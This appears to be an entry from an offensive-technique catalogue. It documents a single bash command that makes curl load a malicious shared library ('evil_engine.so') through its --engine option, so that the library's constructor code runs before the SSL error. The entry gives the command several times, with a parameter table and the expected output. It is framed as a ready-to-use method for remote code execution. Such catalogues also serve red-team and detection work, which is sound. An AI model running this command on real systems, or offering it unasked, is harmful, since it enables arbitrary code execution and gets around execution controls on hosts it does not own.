---
data: 'curl --engine `pwd`/evil_engine.so https://example.com'
tags:
  - rce
  - curl
type: command
executor: bash
platforms:
  - Linux
  - POSIX
id: 0d2357d7-d89c-441b-a41a-616bcca0f088
created_at: '2025-12-14T17:23:31.188Z'
updated_at: '2025-12-14T17:23:31.188Z'
verified: false
validated: true
submitted: true
---
# curl-trigger-engine-rce

## Command

```bash
curl --engine `pwd`/evil_engine.so https://example.com
```

## Description

Triggers RCE by loading a malicious .so via --engine in curl, executing constructor code before SSL failure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--engine` | Load specified engine library | Yes |
| `` `pwd`/evil_engine.so `` | Absolute path to malicious .so file | Yes |
| `https://example.com` | Target URL for fetch attempt | Yes |

## Examples

### Basic Usage

```bash
curl --engine `pwd`/evil_engine.so https://example.com
```

### Advanced Usage

curl --engine ./evil_engine.so --silent https://example.com

## Expected Output

Error like 'curl: (53) SSL Engine '...' not found'; RCE occurs before this

## Related

- [[procedures/Trigger-RCE-with-curl-Engine]]
